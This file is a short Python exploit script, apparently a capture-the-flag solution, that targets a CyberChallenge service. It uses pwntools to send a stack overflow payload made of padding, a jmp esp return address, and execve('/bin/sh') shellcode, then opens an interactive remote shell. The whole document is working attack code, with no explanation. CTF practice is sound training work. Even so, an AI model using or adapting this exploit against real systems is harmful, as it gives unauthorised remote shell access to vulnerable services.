import os
from pwn import *
from time import time


r = remote("shell.challs.cyberchallenge.it", 9123)
print(r.recv())

shellcode=b"\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"

jump_esp_address = p32(0x08048593)
payload = b"A"*44 + jump_esp_address + shellcode
r.sendline(payload)
print(r.recv())
sleep(1)
r.sendline(b"ls")
r.interactive()
#print(r.recv())



